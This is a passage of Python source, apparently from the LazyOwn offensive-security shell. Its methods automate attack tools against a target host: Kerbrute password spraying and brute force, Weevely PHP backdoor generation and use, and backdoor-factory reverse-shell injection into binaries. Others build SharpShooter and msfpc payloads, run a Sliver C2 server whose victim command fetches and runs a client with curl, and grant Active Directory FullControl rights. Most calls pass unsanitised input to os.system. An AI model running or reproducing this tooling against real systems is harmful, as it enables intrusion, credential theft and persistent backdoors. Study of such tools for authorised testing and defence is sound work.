            print_error(f"Url must be set use{GREEN} set url http://example.com")
            return
        domain = get_domain(url)
        file = "sessions/credentials.txt"
        if os.path.exists(file):
            with open(file, "r") as f:
                for file_line in f:
                    params = file_line.split(":")
                    user = params[0]
                    passwd = params[1].replace("\n", "")
                    choice = input("    [!] Credentials found use Digest or basic (1 or 2) :")
                    if choice == "1":
                        auth_type = "Digest"
                    else:
                        auth_type = "basic"
                    extra = f"--auth_type {auth_type} --auth_user {user} --auth_pass {passwd} "

        command = f"cewl -d 2 -m 5 -w sessions/cewl_{domain}.txt {extra} -v {url}"
        print_msg(command)
        os.system(command)
        return

    def do_dmitry(self, line):
        """
        This function constructs and executes a command for the 'dmitry' tool.
        It first checks if the 'url' parameter is set. If not, it prints an error message.
        If the 'url' is set, it extracts the domain from the URL using the get_domain function.
        Then, it constructs a 'dmitry' command with the specified parameters and prepares it for execution.
        
        Run a domain whois lookup (w), an IP whois lookup (i), retrieve Netcraft info (n), search for subdomains (s), search for email addresses (e), do a TCP port scan (p), and save the output to example.txt (o) for the domain example.com:
        
        Parameters:
        line (str): The command line input for this function.

        Expected self.params keys:
        - url (str): The URL to be used for the 'dmitry' command.

        Example usage:
        - set url http://example.com
        - do_dmitry
        """        
        if not is_binary_present("dmitry"):
            print_warn("Installing dmitry...")
            os.system("sudo apt install dmitry -y")

        url = self.params["url"]
        if not url:
            print_error(f"Url must be set use{GREEN} set url http://example.com")
            return
        domain = get_domain(url)
        
        command = f"dmitry -winseo sessions/dmitry_{domain}.txt {domain}"
        print_msg(command)
        os.system(command)
        return

    def do_graudit(self, line):
        """
        Executes the graudit command to perform a static code analysis with the specified options.

        This function runs the 'graudit' tool with the '-A' option for an advanced scan and 
        the '-i sessions' option to include session files. The results will be displayed 
        directly in the terminal.

        Args:
            line (str): Input line from the command interface. This argument is currently 
                        not used within the function but is required for the command 
                        interface structure.
                        
        Example:
            To run this function from the command interface, simply type 'graudit' and press enter.
            The function will execute the 'graudit -A -i sessions' command.

        Note:
            Ensure that 'graudit' is installed and properly configured in your system's PATH 
            for this function to work correctly.
        """

        if not is_binary_present("graudit"):
            print_warn("Installing graudit...")
            os.system("sudo apt install graudit -y")

        command = "graudit -A -i sessions"
        os.system(command)
        return

    def do_msfrpc(self, line):
        """
        Connects to the msfrpcd daemon and allows remote control of Metasploit.

        Usage:
            msfrpc -a <IP address> -p <port> -U <username> -P <password> [-S]

        This command will prompt the user for necessary information to connect to msfrpcd.
        """
        # Prompt the user for connection details
        ip_address = input("    [!] Enter the IP address to connect to (default: 127.0.0.1): ") or "127.0.0.1"
        port = input("    [!] Enter the port to connect to (default: 55553): ") or "55553"
        username = input("    [!] Enter the username: ")
        password = input("    [!] Enter the password: ")
        use_ssl = input("    [!] Disable SSL? (yes/no, default: no): ").strip().lower() == "yes"

        # Construct the msfrpc command
        cmd = ["msfrpc", "-a", ip_address, "-p", port, "-U", username, "-P", password]
        if use_ssl:
            cmd.append("-S")

        # Run the command
        try:
            subprocess.run(cmd, check=True)
        except subprocess.CalledProcessError as e:
            print_error(f"Error connecting to msfrpcd: {e}") 

    def do_nuclei(self, line):
        """
        Executes a Nuclei scan on a specified target URL or host.

        Usage:
            nuclei -u <URL> [-o <output file>] [other options]

        If a URL is provided as an argument, it will be used as the target for the scan.
        Otherwise, it will use the target specified in self.params["rhost"].
        """
        if not is_binary_present("nuclei"):
            print_warn("Installing nuclei...")
            os.system("sudo apt install nuclei -y")
            
        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return
        
        output_file = f"sessions/{rhost}_nuclei_output.txt"
        cmd = ["nuclei", "-u", rhost, "-o", output_file]
        try:
            subprocess.run(cmd, check=True)
            os.system(f"cat {output_file}")
        except subprocess.CalledProcessError as e:
            print_error(f"Error running Nuclei scan: {e}")

    def do_parsero(self, line):
        """
        Executes a parsero scan on a specified target URL or host.

        Usage:
            parsero -u <URL> [-o <output file>] [other options]

        If a URL is provided as an argument, it will be used as the target for the scan.
        Otherwise, it will use the target specified in self.params["rhost"].
        """
        if not is_binary_present("parsero"):
            print_warn("Installing parsero...")
            os.system("sudo apt install parsero -y")
            
        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return
        
        output_file = f"sessions/{rhost}_parsero_output.txt"
        cmd = ["parsero", "-u", rhost, "-sb"]
        
        try:
            with open(output_file, 'w') as f:
                subprocess.run(cmd, check=True, stdout=f, stderr=subprocess.STDOUT)
            os.system(f"cat {output_file}")
        except subprocess.CalledProcessError as e:
            print_error(f"Error running parsero scan: {e}")

    def do_sherlock(self, line):
        """
        Executes the Sherlock tool to find usernames across social networks.

        This function takes a username as an argument and runs the Sherlock tool 
        to check for the username's presence on various social networks. The 
        results are saved in CSV format in the `sessions` directory.

        Parameters:
        line (str): The username to be checked by Sherlock. If not provided, an 
                    error message is printed and the function returns.

        Returns:
        None

        Raises:
        None

        Example:
        >>> do_sherlock("example_user")
        Running command: sherlock example_user --local -v --csv --print-found

        Additional Notes:
        - The Sherlock tool must be installed and available in the system path.
        - The results are saved in the `sessions` directory as a CSV file.
        - The `--local` flag forces the use of a local `data.json` file, 
        which should be present in the appropriate directory.
        """
        if not is_binary_present("sherlock"):
            print_warn("installing sherlock...")
            os.system("sudo apt install sherlock -y")

        if not line:
            print_error("You must pass the username like argument.")
            return
        command = f"cd sessions && sherlock {line} --local -v --csv --print-found"
        print_msg(f"sherlock {line} --local -v --csv --print-found")
        os.system(command)
        return

    def do_trufflehog(self, line):
        """
        Executes trufflehog to search for secrets in a given Git repository URL. 
        If trufflehog is not installed, it installs the tool automatically. 
        This function navigates to the 'sessions' directory and runs trufflehog 
        with the provided Git URL, outputting the results in JSON format.

        Args:
            line (str): The Git repository URL to scan for secrets.

        Returns:
            None

        Raises:
            None

        Example:
            trufflehog https://github.com/user/repo.git

        Notes:
            - Ensure that trufflehog is installed or it will be installed automatically.
            - The output of the trufflehog scan is printed and executed in the 'sessions' directory.
        """
        
        if not is_binary_present("trufflehog"):
            print_warn("installing trufflehog...")
            os.system("sudo apt install trufflehog -y")

        if not line:
            print_error("You must pass the git url like argument.")
            return
       
        command = f"cd sessions && trufflehog git {line} --json"
        print_msg(f"trufflehog git {line} --json")
        os.system(command)
        return

    def do_weevelygen(self, line):
        """
        Generate a PHP backdoor using Weevely, protected with the given password.

        This function generates a PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically. 

        Usage:
        ┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
        └╼ $ weevelygen s3cr3t

        Parameters:
        line (str): The password to protect the generated PHP backdoor.

        Returns:
        None

        Raises:
        print_error: If the password argument is not provided.
        print_warn: If Weevely is not installed and needs to be installed.

        Example:
        To generate a PHP backdoor protected with the password 's3cr3t', use the following command:
        $ weevelygen s3cr3t
        """
        if not is_binary_present("weevely"):
            print_warn("installing weevely...")
            os.system("sudo apt install weevely -y")

        if not line:
            print_error("You must pass the password of weevly shell as an argument. example: weevelygen s3cr3t")
            return
       
        command = f"cd sessions && weevely generate {line} weevely.php"
        print_msg(f"weevely generate {line}")
        os.system(command)
        print_msg("Now you can run: weevely http//:victim.local/weevely.php s3cr3t")
        return
        
    def do_weevely(self, line):
        """
        Connect to PHP backdoor using Weevely, protected with the given password.

        This function Connect to PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically. 

        Usage:
        ┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
        └╼ $ weevely http://victim.local/weevely.php s3cr3t

        Parameters:
        line (str): the url to Weevely shell and the password to protect the generated PHP backdoor.

        Returns:
        None

        Raises:
        print_error: If the password argument is not provided.
        print_warn: If Weevely is not installed and needs to be installed.

        Example:
        To generate a PHP backdoor protected with the password 's3cr3t', use the following command:
        $ weevelygen s3cr3t
        """
        if not is_binary_present("weevely"):
            print_warn("installing weevely...")
            os.system("sudo apt install weevely -y")

        if not line:
            print_error("You must pass url and the password of weevly shell as an argument. example: weevely http://victim.local/weevely.php s3cr3t")
            return
        
        args = line.split(" ")

        if len(args) == 2:
            url = args[0]
            password = args[1]
            command = f"weevely {url} {password}"
            print_msg(command)
            os.system(command)
        else:
            print_error("You must pass url and the password of weevly shell as an argument. example: weevely http://victim.local/weevely.php s3cr3t")
            return
        return

    def do_changeme(self, line):
        """
        Executes a changeme scan on a specified target URL or host.

        Usage:
            changeme [-o <output file>] --oa -t 20 rhost

        If a URL is provided as an argument, it will be used as the target for the scan.
        Otherwise, it will use the target specified in self.params["rhost"].
        """
        if not is_binary_present("changeme"):
            print_warn("Installing changeme...")
            os.system("sudo apt install changeme -y")
            
        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return
        
        output_file = f"sessions/{rhost}_changeme_output"
        cmd = ["changeme", "-a", "-o", output_file, "--oa", "-t", "20", rhost]
        try:
            subprocess.run(cmd, check=True)
           
        except subprocess.CalledProcessError as e:
            print_error(f"Error running changeme scan: {e}")
        return

    def do_enum4linux_ng(self, line):
        """
        Performs enumeration of information from a target system using `enum4linux-ng`.

        1. Executes the `enum4linux-ng` command with the `-A` option to gather extensive information from the specified target.

        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
        :param rhost: The target host for enumeration, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually enumerate information from a system, use the following command:
            enum4linu-ng -A <target_host>

        Replace `<target_host>` with the IP address or hostname of the target system.

        For example:
            enum4linux-ng -A 192.168.1.10
        """

        if not is_binary_present("enum4linux-ng"):
            print_warn("Installing enum4linux-ng...")
            os.system("sudo apt install enum4linux-ng -y")

        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return

        rhost = self.params["rhost"]
        print_msg(f"Try... enum4linux-ng -A {rhost} -oY sessions/{rhost}_enum4linux-ng {RESET}")
        os.system(f"enum4linux-ng -A {rhost} -oY sessions/{rhost}_enum4linux-ng")
        return

    def do_fuzz(self, line):
        """
        Executes a web server fuzzing script with user-provided parameters.

        This function prompts the user for the necessary parameters to run the fuzzing script,
        including the target IP, port, HTTP method, directory, file extension, and expected status codes.

        Usage:
            fuzzing

        Parameters:
            line (str): The command line input for the function (not used directly in the current implementation).

        Returns:
            None

        Example:
            To run the fuzzing script, enter the required parameters when prompted by the function.
        """

        if not is_binary_present("closed_source_web_server_fuzz"):
            print_warn("Installing closed_source_web_server_fuzz...")
            os.system("sudo apt install spike -y")

        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return
        target_port = input("    [!] Enter the target port: ")
        http_method = input("    [!] Enter the HTTP method (e.g., GET, POST): ")
        directory = input("    [!] Enter the directory to fuzz (e.g., /): ")
        file_extension = input("    [!] Enter the file extension to test (e.g., .php, .asp): ")
        additional_extension = input("    [!] Enter any additional file extension (e.g., .zip): ")
        status_code_1 = input("    [!] Enter the first expected status code (e.g., 200, 404): ")
        status_code_2 = input("    [!] Enter the second expected status code (if any, otherwise leave blank): ")

        cmd = f"closed_source_web_server_fuzz {rhost} {target_port} {http_method} {directory} {file_extension} {additional_extension} {status_code_1} {status_code_2}"

        print_msg(f"Try... {cmd} {RESET}")
        os.system(cmd)
        return

    def do_sharpshooter(self, line):
        """
        Executes a payload creation framework for the retrieval and execution of arbitrary CSharp source code.
        SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS, and WSF.

        Usage:
            sharpshooter [-o <output file>] --oa -t 20 rhost

        This function installs SharpShooter if it is not already installed, prompts the user for the payload type, 
        and then runs SharpShooter to create a payload based on the specified type.

        Parameters:
            line (str): The command line input for the function (not used directly in the current implementation).

        Returns:
            None

        Example:
            To create a payload using SharpShooter, ensure you have already generated shellcode using lazymsfvenom or venom,
            and then run this function to specify the payload type and generate the final payload file.
        """
        if not is_binary_present("sharpshooter"):
            print_warn("Installing sharpshooter...")
            os.system("sudo apt install sharpshooter -y")
        
        path = os.getcwd()
        file = f"{path}/sessions/shellcode.bin"

        if not os.path.exists(file):
            print_error(f"You need to run the lazymsfvenom or venom command and choose a payload before running sharpshooter to create {file}.")
            return

        payload_type = input("    [!] Enter Payload type: hta, js, jse, vbe, vbs, wsf: ")

        cmd = f"sharpshooter --stageless --payload {payload_type} --output sessions/payload_{payload_type} --dotnetver 2 --rawscfile {file}"
        try:
            os.system(cmd)
        except e:
            print_error(f"Error running sharpshooter scan: {e}")
        return

    def do_sliver_server(self, line):
        """
        Starts the Sliver server and generates a client configuration file for connecting clients.
        Provides options to download the Sliver client for Windows, Linux, or macOS.

        Usage:
            sliver-server [flags]
            sliver-client [command]

        This function installs Sliver if it is not already installed, starts the Sliver server,
        generates the necessary certificates, and creates a client configuration file. 
        It also provides options to download the client for different operating systems.

        Parameters:
            line (str): The command line input for the function (not used directly in the current implementation).

        Returns:
            None

        Example:
            To start the Sliver server, generate the necessary certificates, and download the client,
            run this function. Choose the appropriate client download option based on the operating system.
        """
        if not is_binary_present("sliver-server"):
            print_warn("Installing sliver-server...")
            os.system("sudo apt install sliver-server -y")
        
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        lhost = self.params["lhost"]
        if not check_lhost(lhost):
            return
  
        lport = self.params["lport"]
        if not check_lport(lport):
            return       

        if not line:
            print_error("You need pass hte name of the victim")
            return

        server_port = self.params["lport"]

        print_msg("download the sliver client")
        time.sleep(3)

        p.onecmd("download_resources")

        print_msg("Choose the client to download:")
        print_msg("1. Windows")
        print_msg("2. Linux")
        print_msg("3. macOS")

        choice = input("Enter your choice (1, 2, or 3): ")
        if choice == "1":
            download_url = f"http://{lhost}/sliver-client_windows.exe"
            name = "sliver.exe"
        elif choice == "2":
            download_url = f"http://{lhost}/sliver-client_linux"
            name = "sliver"
        elif choice == "3":
            download_url = f"http://{lhost}/sliver-client_macos"
            name = "sliver"
        else:
            print_error("Invalid choice.")
            return
        os.system("cd sessions && chmod +x sliver* && upx sliver*")
        print_msg(f"Copy Download client command {download_url}...")
        try:
            cmd = f"curl -o {name} {download_url} && curl -o config.cfg http://{lhost}/{line}_file.cfg && chmod +x {name} && ./{name} import config.cfg && ./{name}"
            copy2clip(cmd)
        except Exception as e:
            print_error(f"Error copy: {e}")

        print_msg("Starting the Sliver server...")
        cmd = "cd sessions && sliver-server"
        try:
            os.system(f"sliver-server operator -l {lhost} -p {lport} -n {line} -s sessions/{line}_file.cfg")
            os.system(cmd)
            print_msg("Sliver server started successfully.")
        except subprocess.CalledProcessError as e:
            print_error(f"Error starting Sliver server: {e}")
            return

        return
    
    def do_gencert(self, line):
        """
        Generates a certificate authority (CA), client certificate, and client key.
        
        Returns:
            str: Paths to the generated CA certificate, client certificate, and client key.
        """
        generate_certificates()
        os.system("mv *.pem sessions")
        return

    def do_kerbrute(self, line):
        """
        Executes the Kerbrute tool to enumerate user accounts against a specified target domain controller.

        This function performs the following actions:
        1. Retrieves necessary parameters such as the target URL and remote host (rhost).
        2. Determines the domain based on the provided URL.
        3. Validates the remote host address.
        4. Constructs and executes the Kerbrute command to enumerate user accounts, saving the results in the sessions/users.txt file.

        Parameters:
        line (str): Specify 'pass' to use credentials from 'credentials.txt' for password spraying, 'brute' to brute force using 'users.txt' and the RockYou wordlist, or leave empty for default behavior.

        Returns:
        None

        Example:
        To enumerate user accounts using Kerbrute, ensure Kerbrute is in your path, 
        then run this function to perform the enumeration.

        Note:
        - The function assumes that the Kerbrute binary (kerbrute_linux_amd64) is present in the system's PATH.
        - The file sessions/users.txt should exist and contain the list of usernames to enumerate.
        """
        if not is_binary_present("kerbrute_linux_amd64"):
            print_warn("Attemp to install kerbrute...")
            cmd = "go get github.com/ropnop/kerbrute"
            os.system(cmd)

        url = self.params["url"]
        rhost = self.params["rhost"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"
        domain = get_domain(url)
        
        if not check_rhost(rhost):
            return

        path_cred = "sessions/credentials.txt"
        
        if line == "pass":
            if not os.path.exists(path_cred):
                print_error("you need credentials.txt exec: createcredentials admin:admin")
                return
            with open(path_cred, "r") as file:
                for file_line in file:
                    params = file_line.split(":")
                    user = params[0]
                    passwd = params[1].replace("\n", "")
                    command = f"kerbrute_linux_amd64 passwordspray --dc {rhost} -d {domain} -t 20 -v {users_txt} '{passwd}'"
                    print_msg(command)
                    os.system(command)

        if line == "brute":
            if not os.path.exists(users_txt):
                print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
                return
            wordlist = self.params["wordlist"]
            with open(users_txt, "r") as file:
                for user in file:
                    user = user.strip()
                    command = f"kerbrute_linux_amd64 bruteuser --dc {rhost} -d {domain} -t 20 -v {wordlist} {user}"
                    print_msg(command)
                    os.system(command)                
        else:
            command = f"kerbrute_linux_amd64 userenum --dc {rhost} -d {domain} -t 20 -v {users_txt} "
            print_msg(command)
            os.system(command)
        return

    def do_dacledit(self, line):
        """
        Execute the dacledit.py command for a specific user or all users listed in the users.txt file.

        This function interacts with the DACL editor to modify access control lists in an Active Directory environment. 
        It allows the user to select a specific user from the list or execute the command for all users.
        Install impacket suit to get this script in the examples
        Args:
            line (str): The organizational unit (OU) in the format 'OU=EXAMPLE,DC=DOMAIN,DC=EXT'. If not provided, the user is prompted to enter it.

        Returns:
            None

        Workflow:
            1. Extract parameters and set up paths.
            2. Check the reachability of the remote host.
            3. Prompt the user for an OU if not provided.
            4. Check if the users.txt file exists and read the list of users.
            5. Display the list of users and prompt the user to select a specific user.
            6. Execute the dacledit.py command for the selected user or all users.

        Raises:
            FileNotFoundError: If the users.txt file does not exist.
        
        Example:
            To execute the command for a specific user:
            >>> do_dacledit("MARKETING DIGITAL")

            To execute the command for all users:
            >>> do_dacledit("")
        """        
        url = self.params["url"]
        rhost = self.params["rhost"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"
        domain = get_domain(url)
        ca = domain.split(".")
        base_domain = ca[0].upper()
        ext = ca[1].upper()
        if not check_rhost(rhost):
            return
        if not line:
            line = input("    [!] Enter OU= example MARKETING DIGITAL: ")

        if not os.path.exists(users_txt):
            print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
            return

        with open(users_txt, "r") as file:
            users = [user.strip() for user in file]

        print_msg("Select a user by number to execute the command for a specific user, or press Enter to execute for all users:")
        for idx, user in enumerate(users, start=1):
            print_warn(f"{idx}. {user}")

        selection = input("Enter the number of the user you want to select: ").strip()

        if selection.isdigit():
            user = users[int(selection) - 1]
            command = command = f"export KRB5CCNAME=/tmp/{user}.ccache ; dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '{user}' -target-dn 'OU={line},DC={base_domain},DC={ext}' '{domain}/{user}' -k -no-pass -dc-ip {rhost}"
            print_msg(command)
            os.system(command)
        else:
            for user in users:
                command = f"export KRB5CCNAME=/tmp/{user}.ccache ; dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '{user}' -target-dn 'OU={line},DC={base_domain},DC={ext}' '{domain}/{user}' -k -no-pass -dc-ip {rhost}"
                print_msg(command)
                os.system(command) 
        return

    def do_bloodyAD(self, line):
        """
        Execute the bloodyAD.py command for a specific user or all users listed in the users.txt file.

        This function interacts with BloodyAD to add users to a group in an Active Directory environment.
        It allows the user to select a specific user from the list or execute the command for all users.
        (use download_external option 48 to clone the repo)
        Args:
            line (str): The organizational unit (OU) in the format 'CN=EXAMPLE,DC=DOMAIN,DC=EXT'. 
                        If not provided, the user is prompted to enter it.

        Returns:
            None

        Workflow:
            1. Extract parameters and set up paths.
            2. Check the reachability of the remote host.
            3. Prompt the user for a CN if not provided.
            4. Check if the users.txt file exists and read the list of users.
            5. Display the list of users and prompt the user to select a specific user.
            6. Execute the bloodyAD.py command for the selected user or all users.

        Raises:
            FileNotFoundError: If the users.txt file does not exist.
        
        Example:
            To execute the command for a specific user:
            >>> do_bloodyAD("")

            To execute the command for all users:
            >>> do_bloodyAD("")
        """
        url = self.params["url"]
        rhost = self.params["rhost"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"
        domain = get_domain(url)
        ca = domain.split(".")
        base_domain = ca[0].upper()
        ext = ca[1].upper()
        if not check_rhost(rhost):
            return
        
        cn = input("    [!] Enter CN= example CHIEFS MARKETING: ")

        if not os.path.exists(users_txt):
            print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
            return
 
        with open(users_txt, "r") as file:
            users = [user.strip() for user in file]

        print_msg("Select a user by number to execute the command for a specific user, or press Enter to execute for all users:")
        for idx, user in enumerate(users, start=1):
            print_warn(f"{idx}. {user}")

        selection = input("Enter the number of the user you want to select: ").strip()
        sub = input("enter the subdomain example dc01: ")
        if selection.isdigit():
            selected_user = users[int(selection) - 1]
            command = f"export KRB5CCNAME=/tmp/{selected_user}.ccache ; bloodyAD --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {selected_user} -k  add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {selected_user}"
            print_msg(command)
            os.system(command)
        else:
            for user in users:
                command = f"export KRB5CCNAME=/tmp/{user}.ccache ; bloodyAD --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {user} -k add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {user}"
                print_msg(command)
                os.system(command) 

    def do_evilwinrm(self, line):
        """
        Executes the Evil-WinRM tool to attempt authentication against the specified target.

        This function performs the following actions:
        1. Checks if the provided target host (`rhost`) is valid.
        2. If the `line` argument is "pass", it reads credentials from the `credentials.txt` file and attempts authentication for each user-password pair using Evil-WinRM.
        3. If `line` is not "pass", it prints an error message indicating the correct usage.

        Parameters:
        line (str): A command argument to determine the action. 
                    If "pass", the function reads credentials from the `credentials.txt` file and attempts to authenticate.
                    If not "pass", it prints an error message with usage instructions.

        Returns:
        None
        """        
        rhost = self.params["rhost"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"
        url = self.params["url"]
        domain = get_domain(url)
        
        if not check_rhost(rhost):
            return

        path_cred = "sessions/credentials.txt"        
        
        sub = input("enter the subdomain example dc01: ")
        if not os.path.exists(path_cred):
            print_error("you need credentials.txt exec: createcredentials admin:admin")
            user = input("Enter the username: ")

            command = f"evil-winrm -i {sub}.{domain} -u \"{user}\" -r INFILTRATOR.HTB"
        with open(path_cred, "r") as file:
            for file_line in file:
                params = file_line.split(":")
                user = params[0]
                passwd = params[1].replace("\n", "")
                command = f"evil-winrm -i {rhost} -u {user} -p '{passwd}'"
                print_msg(command)
                os.system(command)
        return

    def do_getTGT(self, line):
        """
        Requests a Ticket Granting Ticket (TGT) using the Impacket tool with provided credentials.

        This function performs the following actions:
        1. Checks if the provided target host (`rhost`) is valid.
        2. Reads credentials from the `credentials.txt` file.
        3. Uses each credential (username and password) to request a TGT with the Impacket tool.
        4. Constructs and executes the Impacket command to obtain a TGT for each set of credentials.

        Parameters:
        line (str): A command line argument, not used in this implementation.

        Returns:
        None
        """
        url = self.params["url"]
        domain = get_domain(url)
        rhost = self.params["rhost"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"
        
        if not check_rhost(rhost):
            return

        path_cred = "sessions/credentials.txt"        
       
        if not os.path.exists(path_cred):
            print_error("you need credentials.txt exec: createcredentials admin:admin")
            return
        with open(path_cred, "r") as file:
            for file_line in file:
                params = file_line.split(":")
                if not line:
                    user = params[0]
                else:
                    user = line
                passwd = params[1].replace("\n", "")
                tmp = f"/tmp/{user}.ccache"
                command = f"export KRB5CCNAME={tmp} ; sudo impacket-getTGT -dc-ip {rhost} '{domain}/{user}:{passwd}'"
                print_msg(command)
                os.system(command)
                cmd = f"mv {user}.ccache {tmp}"
                print_msg(cmd)
                os.system(cmd)
        
        return

    def do_apache_users(self, line):
        """
        Performs enumeration of users from a target system using `apache-users`.

        1. Executes the `apache-users` command with the `-h` option to specified target.

        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
        :param rhost: The target host for enumeration, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually enumerate information from a system, use the following command:
            apache-users -h <target_host> -l <wordlist> -p <apache_port> -s 0 -e 403 -t 10

        Replace `<target_host>` with the IP address or hostname of the target system.

        For example:
            apache-users -h 192.168.1.202 -l /usr/share/wordlists/metasploit/unix_users.txt -p 80 -s 0 -e 403 -t 10
        """

        if not is_binary_present("apache-users"):
            print_warn("Installing apache-users...")
            os.system("sudo apt install apache-users -y")
        
        usrwordlist = self.params["usrwordlist"]
        if not usrwordlist:
            print_error("User wordlist must be seted, use: set usrwordlist /path/to/wordlist")
            return

        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return

        rhost = self.params["rhost"]
        print_msg(f"Try... apache-users -h  {rhost} -l {usrwordlist} -p 80 -s 0 -e 403 -t 10 {RESET}")
        os.system(f"apache-users -h  {rhost} -l {usrwordlist} -p 80 -s 0 -e 403 -t 10")
        return

    def do_backdoor_factory(self, line):
        """
        Creates a backdoored executable using `backdoor-factory`.

        This function checks if `backdoor-factory` is installed, installs it if necessary, and then uses it to 
        inject a reverse shell payload into a specified binary file. The binary is backdoored with a 
        reverse shell payload that connects back to a specified host and port.

        :param line: The absolute path to the file that will be backdoored. If not provided, the user is prompted 
                    to enter the path.

        :returns: None

        Manual execution:
        To manually create a backdoored executable, use the following command:
            backdoor-factory -f <file_path> -H <lhost> -P <lport> -s reverse_shell_tcp_inline -J -a -c -l 128 -o <output_file>

        Replace `<file_path>` with the path to the binary you want to backdoor, `<lhost>` with the IP address of 
        the attacker’s machine, and `<lport>` with the port number to listen on. The `<output_file>` is the path 
        where the backdoored binary will be saved.

        For example:
            backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe
        """

        if not is_binary_present("backdoor-factory"):
            print_warn("Installing backdoor-factory...")
            os.system("sudo apt install backdoor-factory -y")

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return

        if not check_lport(lport):
            return

        if not line:
            print_error("you need enter the path to file to backdoored")
            line = input("    [!] Enter the absolute path: ")

        print_msg(f"Try... backdoor-factory -f {line} -H {lhost} -P {lport} -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe {RESET}")
        os.system(f"backdoor-factory -f {line} -H {lhost} -P {lport} -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe")
        return


    def do_davtest(self, line):
        """
        Tests WebDAV server configurations using `davtest`.

        This function checks if `davtest` is installed and installs it if necessary. It then runs `davtest` 
        to perform a WebDAV server test against a specified URL or the default URL configured in `self.params`.

        :param line: The URL of the WebDAV server to test. If provided, it overrides the default URL. 
                    If not provided, the function uses the URL specified in `self.params["rhost"]`.

        :returns: None

        Manual execution:
        To manually test a WebDAV server, use the following command:
            davtest --url <url>

        Replace `<url>` with the URL of the WebDAV server you want to test.

        For example:
            davtest --url http://example.com/webdav
        """

        if not is_binary_present("davtest"):
            print_warn("Installing davtest...")
            os.system("sudo apt install davtest -y")

        url = self.params["url"]
        if line:
            rhost = line
        else:
            rhost = "http://" + self.params["rhost"]
            if not check_rhost(rhost):
                return

  
        print_msg(f"Try... davtest --url {rhost} {RESET}")
        os.system(f"davtest --url {rhost}")
        print_msg(f"Try... davtest --url {url} {RESET}")
        os.system(f"davtest --url {url}")
        return

    def do_msfpc(self, line):
        """
        Generates payloads using MSFvenom Payload Creator (MSFPC).

        This function checks if `msfpc` is installed and installs it if necessary. It then runs `msfpc`
        with the specified parameters to create a payload for penetration testing.

        :param line: Not used in this implementation but reserved for future use.

        :returns: None

        Manual execution:
        To manually generate a payload using MSFPC, use the following command:
            msfpc <TYPE> <DOMAIN/IP> <PORT> <CMD/MSF> <BIND/REVERSE> <STAGED/STAGELESS> <TCP/HTTP/HTTPS/FIND_PORT> <BATCH/LOOP> <VERBOSE>

        Replace the placeholders with the desired values. For example:
            msfpc windows 192.168.1.10 4444 reverse stageless tcp verbose

        Example usage:
            msfpc windows 192.168.1.10        # Windows & manual IP.
            msfpc elf bind eth0 4444          # Linux, eth0's IP & manual port.
            msfpc stageless cmd py https      # Python, stageless command prompt.
            msfpc verbose loop eth1           # A payload for every type, using eth1's IP.
            msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
        """

        if not is_binary_present("msfpc"):
            print_warn("Installing msfpc...")
            os.system("sudo apt install msfpc -y")

        payload_types = [
            "APK",
            "ASP",
            "ASPX",
            "Bash [.sh]",
            "Java [.jsp]",
            "Linux [.elf]",
            "OSX [.macho]",
            "Perl [.pl]",
            "PHP",
            "Powershell [.ps1]",
            "Python [.py]",
            "Tomcat [.war]",
            "Windows [.exe // .exe // .dll]"
        ]

        print_warn("Select the payload type:")
        for i, payload_type in enumerate(payload_types, start=1):
            print_msg(f"{i}. {payload_type}")

        type_choice = int(input("Enter the number corresponding to the payload type: ")) - 1
        if type_choice < 0 or type_choice >= len(payload_types):
            print_error("Invalid choice. Please select a valid number.")
            return

        selected_type = payload_types[type_choice].split()[0].lower()

        params = {
            "type": selected_type,
            "lhost": input("Enter the target IP or domain (default lhost): ") or self.params["lhost"],
            "lport": input("Enter the port (default lport): ") or self.params["lport"],
            "cmd_msf": input("Enter CMD or MSF (default msf): ") or "msf",
            "bind_reverse": input("Enter BIND or REVERSE (default reverse): ") or "reverse",
            "staged_stageless": input("Enter STAGED or STAGELESS (default stageless): ") or "stageless",
            "protocol": input("Enter protocol (TCP, HTTP, HTTPS, FIND_PORT) (default tcp): ") or "tcp",
